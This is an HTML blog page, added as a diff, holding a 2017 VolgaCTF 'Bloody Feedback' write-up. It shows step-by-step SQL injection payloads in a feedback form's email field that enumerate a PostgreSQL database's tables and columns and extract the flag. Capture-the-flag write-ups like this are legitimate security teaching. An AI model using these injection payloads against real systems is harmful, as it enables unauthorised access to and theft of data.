@@ -1,0 +1,130 @@
+<!doctype html><html lang=en><head>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta charset=utf-8>
+<meta content="utf-8" http-equiv=encoding>
+<link rel=preload href=/fonts/FiraCode-VariableFont_wght.ttf as=font type=font/ttf crossorigin>
+<link rel=stylesheet href=/css/grid.css type=text/css>
+<link rel=stylesheet href=/css/highlight.css type=text/css>
+<link rel=stylesheet href=/css/main.css type=text/css>
+<meta name=apple-mobile-web-app-title content="dubell.io | VolgaCTF - Bloody Feedback writeup">
+<meta name=apple-mobile-web-app-capable content="yes">
+<meta name=apple-mobile-web-app-status-bar-style content="black-translucent">
+<meta name=twitter:site content="@dubs3c">
+<meta name=twitter:creator content="@dubs3c">
+<meta property="og:title" content="dubell.io | VolgaCTF - Bloody Feedback writeup">
+<meta name=twitter:title content="dubell.io | VolgaCTF - Bloody Feedback writeup">
+<meta itemprop=name content="dubell.io | VolgaCTF - Bloody Feedback writeup">
+<meta name=application-name content="dubell.io | VolgaCTF - Bloody Feedback writeup">
+<meta property="og:site_name" content="dubell.io">
+<meta property="og:article:published_time" content="2017-03-28T00:00:00Z">
+<meta property="article:published_time" content="2017-03-28T00:00:00Z">
+<base href=/www/volgactf-bloody-feedback-writeup/>
+<link rel=canonical href=/www/volgactf-bloody-feedback-writeup/ itemprop=url>
+<meta name=url content="/www/volgactf-bloody-feedback-writeup/">
+<meta name=twitter:url content="/www/volgactf-bloody-feedback-writeup/">
+<meta property="og:url" content="/www/volgactf-bloody-feedback-writeup/">
+<meta name=description content>
+<meta itemprop=description content>
+<meta property="og:description" content>
+<meta name=twitter:description content>
+<meta itemprop=image content="/">
+<meta property="og:image" content>
+<meta name=twitter:image content>
+<meta name=twitter:image:src content>
+<meta property="og:updated_time" content="2017-03-28T00:00:00Z">
+<link rel=sitemap type=application/xml title=Sitemap href=sitemap.xml>
+<title>dubell.io | VolgaCTF - Bloody Feedback writeup</title>
+</head><body>
+<div id=particles-js></div>
+<main><div class=row>
+<header class="col center">
+<a href=/ class=noleet><img href=/ class=banner-image src=/img/logo2.png alt=logo></a>
+</div>
+</div>
+<div class=row>
+<div class="col center">
+<nav>
+<fieldset>
+<legend>n4vig4ti0n</legend>
+<ul>
+<li><a href=/>/etc/motd</a></li>
+<li><a href=/www/>/var/www</a></li>
+<li><a href=/mnt/>/mnt</a></li>
+<li><a href=/usr/>/usr</a></li>
+</ul>
+</fieldset>
+</nav>
+</div>
+</div>
+<div class=content>
+<article>
+<center><h1>VolgaCTF - Bloody Feedback writeup</h1>
+<br>
+<span class=small><strong>Date:</strong> 2017-03-28 </span>
+<span class=small><strong>Category:</strong> <a href=/categories/ctf>CTF</a> </span>
+<span class=small><strong>Reading time:</strong> 3 minutes</span>
+<br><br>
+<hr>
+</center>
+<br>
+<pre tabindex=0><code>Bloody Feedback
+
+Send your feedback at bloody-feedback.quals.2017.volgactf.ru
+
+DO. NOT. USE. SQLMAP
+Otherwise your IP will be banned
+</code></pre><p>The challenge basically has two functions, 1) Send feedback and 2) view the status of the sent feedback. There is also page that cotains &ldquo;Top Messages&rdquo; which is the feedback people send in. When you send feedback you get a token back which you can use to see if the feedback has been processed or not.</p>
+<p>I first tried to steal cookies via the feedback form but it turned out that everything was filtered. My second try involved finding a SQL injection vulnerability at the feedback status page:</p>
+<pre tabindex=0><code>http://bloody-feedback.quals.2017.volgactf.ru/check/?code=&lt;token here&gt;
+</code></pre><p><img src=../images/not_processed.png alt=not_processed></p>
+<p>I got nothing, the only thing I could deduce was that every feedback sent, had a default status of &ldquo;not processed&rdquo;. I assumed this would change after a while but it never did.</p>
+<p>My next attempt was to intercept the POST submission from the feedback form with burp to see if any parameters were vulnerable. By entering <code>lol'</code> as email, the following error was triggered:</p>
+<pre tabindex=0><code>&lt;div class=&quot;container&quot;&gt;
+&lt;div class=&quot;page-header&quot;&gt;
+&lt;h2&gt;Error&lt;/h2&gt;
+&lt;/div&gt;
+&lt;div class=&quot;alert alert-danger&quot;&gt;
+	&lt;p&gt;ERROR: DBD::Pg::db do failed: ERROR:  syntax error at or near &quot;not&quot;
+	LINE 1: ...HRkIBBUOq9M40ZqvsB1TcwWVWt','smacker','m','lol'','not proces...
+	                                                 ^ at Worker.pm line 29.&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+</code></pre><p>I realised that when you send your feedback, the program automatically inserts &ldquo;not processed&rdquo; along with the feedback. My working theory at ths point was to substitute the &ldquo;not processed&rdquo; field with an SQL query of my choosing. After a few tries I constructed the following query:</p>
+<pre tabindex=0><code>name=smacker&amp;message=m&amp;email=lol',(select version()))--
+</code></pre><p>However I got an error message indicating that the field allows a maximum of 30 chars, so I simply added substring():</p>
+<pre tabindex=0><code>name=smacker&amp;message=m&amp;email=lol',(select substr(version(),0,30)))--
+</code></pre><p><img src=../images/postgres.png alt=not_processed></p>
+<p>Now when I checked the status page of my feedback with the token I got, instead of seeing &ldquo;not processed&rdquo;, I saw <code>PostgreSQL 9.5.6 on x86_64-pc</code>. Now I knew how to display my SQL queries on the site, by overwriting the &ldquo;not processed&rdquo; field.</p>
+<p>So I tried a few other things:</p>
+<pre tabindex=0><code>user = fcgi_user         =&gt;  name=smacker&amp;message=m&amp;email=lol',(select substr(user,0,30)))--
+database = feedback_db   =&gt;  name=smacker&amp;message=m&amp;email=lol',(select substr(current_database(),0,30)))--
+</code></pre><p>Since the field can&rsquo;t hold multiple rows/values, I had to use LIMIT X OFFSET Y in order to step through each element in the set that the database returned. The following code snippets shows how I enumerated the database to find the flag.</p>
+<p><strong>Databases:</strong></p>
+<pre tabindex=0><code>postgres =&gt; name=smacker&amp;message=m&amp;email=lol',(select substr(datname ,0,30) FROM pg_database LIMIT 1 OFFSET 1))--
+template1 =&gt; name=smacker&amp;message=m&amp;email=lol',(select substr(datname ,0,30) FROM pg_database LIMIT 1 OFFSET 2))--
+feedback_db =&gt; name=smacker&amp;message=m&amp;email=lol',(select substr(datname ,0,30) FROM pg_database LIMIT 1 OFFSET 3))--
+</code></pre><p><strong>TABLES:</strong></p>
+<pre tabindex=0><code>s3cret_tabl3 =&gt; name=smacker&amp;message=m&amp;email=lol',(select table_name FROM information_schema.tables WHERE table_schema%3Dcurrent_schema() LIMIT 1 OFFSET 1))--
+</code></pre><p><strong>COLUMNS:</strong></p>
+<pre tabindex=0><code>name =&gt;  name=smacker&amp;message=m&amp;email=lol',(select column_name FROM information_schema.columns WHERE table_schema%3Dcurrent_schema() LIMIT 1 OFFSET 1))--
+email =&gt; name=smacker&amp;message=m&amp;email=lol',(select column_name FROM information_schema.columns WHERE table_schema%3Dcurrent_schema() LIMIT 1 OFFSET 2))--
+message =&gt; name=smacker&amp;message=m&amp;email=lol',(select column_name FROM information_schema.columns WHERE table_schema%3Dcurrent_schema() LIMIT 1 OFFSET 3))--
+status =&gt; name=smacker&amp;message=m&amp;email=lol',(select column_name FROM information_schema.columns WHERE table_schema%3Dcurrent_schema() LIMIT 1 OFFSET 4))--
+id =&gt; name=smacker&amp;message=m&amp;email=lol',(select column_name FROM information_schema.columns WHERE table_schema%3Dcurrent_schema() LIMIT 1 OFFSET 5))--
+s3cr3tc0lumn =&gt; name=smacker&amp;message=m&amp;email=lol',(select column_name FROM information_schema.columns WHERE table_schema%3Dcurrent_schema() LIMIT 1 OFFSET 6))--
+</code></pre><p><strong>Time to get the rows from <code>s3cr3tc0lumn</code></strong></p>
+<pre tabindex=0><code>VolgaCTF =&gt; name=smacker&amp;message=m&amp;email=lol',(select s3cr3tc0lumn FROM s3cret_tabl3 LIMIT 1 OFFSET 1))--
+Volga =&gt; name=smacker&amp;message=m&amp;email=lol',(select s3cr3tc0lumn FROM s3cret_tabl3 LIMIT 1 OFFSET 2))--
+1 =&gt; name=smacker&amp;message=m&amp;email=lol',(select s3cr3tc0lumn FROM s3cret_tabl3 LIMIT 1 OFFSET 3))--
+VolgaCTF{eiU7UJhyeu@ud3*} =&gt; name=smacker&amp;message=m&amp;email=lol',(select s3cr3tc0lumn FROM s3cret_tabl3 LIMIT 1 OFFSET 4))--
+</code></pre><p><img src=../images/flag.png alt=not_processed></p>
+<p><strong>Flag: VolgaCTF{eiU7UJhyeu@ud3*}</strong></p>
+</article>
+</div><footer>
+</footer></main>
+<script src=/js/particles.min.js defer></script>
+<script src=/js/particles.conf.js defer></script>
+<script src=/js/baffle.min.js async></script>
+<script src=/js/main.js defer async></script>
+</body>
+</html>
